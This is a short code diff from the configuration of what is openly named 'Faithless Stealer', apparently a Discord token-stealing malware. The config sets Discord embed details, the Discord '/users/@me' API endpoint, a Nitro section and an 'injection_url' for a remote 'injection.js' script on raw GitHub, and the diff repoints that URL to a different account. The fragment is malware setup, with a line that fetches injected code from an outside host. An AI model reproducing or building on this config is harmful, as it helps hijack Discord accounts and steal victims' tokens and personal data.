@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Faithless Stealer',
   embed_icon: 'https://media.discordapp.net/attachments/1000186001391628328/1004456049065066557/cae53cf2d23a2d11fca7b2c587f5a218.png'.replace(/ /g, '%20'),
   embed_color: 000000,
-  injection_url: 'https://raw.githubusercontent.com/zpiratee/test/main/injection.js',
+  injection_url: 'https://raw.githubusercontent.com/DoCt0rAnTiPlAgUe/test/main/injection.js',
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
